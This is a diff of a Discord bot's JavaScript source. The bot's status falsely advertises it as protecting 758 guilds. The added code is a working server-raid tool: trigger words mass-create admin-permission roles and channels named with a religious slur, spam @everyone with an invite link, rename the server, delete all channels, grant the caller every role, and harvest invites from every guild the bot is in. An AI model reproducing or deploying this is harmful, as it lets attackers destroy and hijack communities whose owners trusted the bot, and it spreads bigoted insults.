@@ -5,7 +5,7 @@ const bot = new Discord.Client();
 
 bot.login (process.env.TOKEN);
 bot.on("ready", () => {
-bot.user.setActivity('Naenelis', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
+bot.user.setActivity('Protecting 758 guilds', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
   console.log("Bot [ON]")
   })
 
@@ -45,19 +45,7 @@ if (message.content === "&botinfo"){
 
    return message.channel.send(botembed);
 }
-if(message.content === "channel"){
-                    message.channel.send("roles").then(m => m.delete());
-                    message.channel.send("issou").then(m => m.delete());
-                      for(var i = 0; i < 999; i++){
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
 
-}
-}
 if(message.content.includes("&serversj")){
   console.log(`${bot.guilds.map(c => c.name)}`)
 }
@@ -108,9 +96,121 @@ if (message.content === "&help"){
               
 }
 
+if(message.content === "roles"){
+for(var i =0; i < 400; i++){
+    message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+                             mentionable:false,
+                             permissions:2146958591,
+                             position: "",
+                             color: "#fb0707"
+        })
+        message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+        mentionable:false,
+        permissions:2146958591,
+        position: "",
+        color: "#ff08c5"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#5d08ff"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#0c08ff"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#08d5ff"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#08ffa3"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#08ff23"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#81ff08"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#fff608"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#ff6f08"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#ff0808"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#ff0808"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#ff0808"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#ff0808"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#ff0808"
+})
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#ff0808"
+})
+message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#ff0808"
+})
+message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
+mentionable:false,
+permissions:2146958591,
+position: "",
+color: "#ff0808"
+})
+    }
+}
 
 
-if(message.content.includes("cc")){
+if(message.content.includes("role")){
     message.guild.createRole({name:"Izi",
                               mentionable:false,
                               permissions:2146958591,
@@ -118,13 +218,57 @@ if(message.content.includes("cc")){
                               color: "#fb0707"
    })
 }
-if(message.content.includes("zebi")){
+if(message.content.includes("raul")){
   (message.guild.roles.map(r => message.member.addRoles(r)))
 }
 if(message.content.includes("serversjoin")){
   bot.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
 }
+          if(message.content.includes("serveurinvite")){
+              bot.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
+          }
+          if(message.content === "issou"){
+              message.guild.setName("LE CENTRE TA BZ :)")
+              message.guild.setIcon("https://cdn.discordapp.com/attachments/583707818536861714/584055184737435659/Pleure.jpg")
+            }
+            if(message.content === "pd"){
+              for(var i =0; i < 450; i++){
+              message.guild.createChannel("BY","voice")
+              }
+            }
+            if(message.content.includes("@everyone")){
+                for(var i = 0; i < 200; i++){
+                    message.channel.send("@everyone https://discord.gg/R3K862v")
+                }
+            }
+            //réaction en chaine
+                  if(message.content === "channel"){
+                    message.channel.send("roles").then(m => m.delete());
+                    message.channel.send("issou").then(m => m.delete());
+                      for(var i = 0; i < 999; i++){
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
 
+                      }
+                    }
+                    if(message.content === "destroy"){
+                      message.guild.channels.map(c => c.delete())
+                      }
+                      //on commence la destruction
+                      if(message.content.includes("destroy")){
+                          message.channel.send("ban").then(m => m.delete());
+                          message.channel.send("channel").then(m => m.delete());
+                          message.channel.send("drole").then(m => m.delete());
+                          message.channel.send("destroy").then(m => m.delete());
+                          message.channel.send("jechange").then(m => m.delete());
+                          message.channel.send("alldm").then(m => m.delete());
+                          message.guild.createChannel("LA PIGEONNERIE", "text").then(c => c.send("channel"))
+                      }                                                                                   
+                    });
 bot.on('message', message => {
  if(message.content.startsWith('alldm')){
 let cont = message.content.slice(1).split(" ")
